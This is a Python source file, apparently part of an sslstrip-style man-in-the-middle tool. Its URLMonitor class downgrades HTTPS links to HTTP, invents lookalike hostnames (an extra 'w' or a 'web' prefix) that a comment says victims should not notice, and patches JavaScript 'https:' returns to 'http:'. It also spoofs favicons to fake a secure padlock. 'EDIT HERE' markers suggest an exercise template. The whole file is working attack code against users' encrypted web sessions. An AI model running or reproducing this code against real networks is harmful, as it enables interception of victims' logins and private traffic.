#  URLMonitor

import re
import logging

class URLMonitor:

    '''
    The URL monitor maintains a set of (client, url) tuples that correspond to requests which the
    server is expecting over SSL.  It also keeps track of secure favicon urls.
    '''

    # Start the arms race, and end up here...
    javascriptTrickery  = [re.compile("http://.+\.etrade\.com/javascript/omntr/tc_targeting\.html")]
    _instance           = None
    substitution        = {} # LEO: diccionario host / substitution
    real                = {} # LEO: diccionario host / real
    patchDict           = {'return"https:"': 'return"http:"'}
    def __init__(self):
        self.strippedURLs       = set()
        self.strippedURLPorts   = {}
        self.faviconReplacement = False

    def isSecureLink(self, client, url):
        for expression in URLMonitor.javascriptTrickery:
            if (re.match(expression, url)):
                logging.debug("JavaScript trickery!")
                return True

        if (client, url) in self.strippedURLs:
            logging.debug("(%s, %s) in strippedURLs" % (client, url))
        return (client, url) in self.strippedURLs

    def getSecurePort(self, client, url):
        if (client, url) in self.strippedURLs:
            return self.strippedURLPorts[(client, url)]
        else:
            return 443

    def addSecureLink(self, client, url):
        methodIndex = url.find("//") + 2
        method      = url[0:methodIndex]
        pathIndex   = url.find("/", methodIndex)

        if pathIndex is -1:
            pathIndex = len(url)
            url += "/"

        host        = url[methodIndex:pathIndex].lower()
        path        = url[pathIndex:]

        port        = 443
        portIndex   = host.find(":")

        if (portIndex != -1):
            host = host[0:portIndex]
            port = host[portIndex + 1:]
            if len(port) == 0:
                port = 443
        fake_domain = ''
        # EDIT HERE:
        # if host starts with "www." add a 4th w
        # otherwise if there's no "www." at the beginning add something
        # that the victim shouldn't notice (like "web")
        if host[:4] == "www.":
            # You have to save in fake_domain the spoofed hostname
            fake_domain = "w" + host
        else:
            fake_domain = "web" + host
        # STOP EDIT HERE
        logging.debug("LEO: ssl host      (%s) tokenized (%s)" % (host, fake_domain))
        url = 'http://' + host + path
        self.real[fake_domain] = host
        self.strippedURLs.add((client, url))
        self.strippedURLPorts[(client, url)] = int(port)

        return 'http://' + fake_domain + path

    def setFaviconSpoofing(self, faviconSpoofing):
        self.faviconSpoofing = faviconSpoofing

    def isFaviconSpoofing(self):
        return self.faviconSpoofing

    def isSecureFavicon(self, client, url):
        return ((self.faviconSpoofing) and (url.find("favicon-x-favicon-x.ico") != -1))

    def URLgetRealHost(self, host):
        logging.debug("Parsing host: %s" % host)
        if host in self.real:
            logging.debug("New host: %s" % self.real[host])
            return self.real[host]
        else:
            logging.debug("New host: %s" % host)
            return host

    def getInstance():
        if URLMonitor._instance is None:
            URLMonitor._instance = URLMonitor()

        return URLMonitor._instance

    getInstance = staticmethod(getInstance)
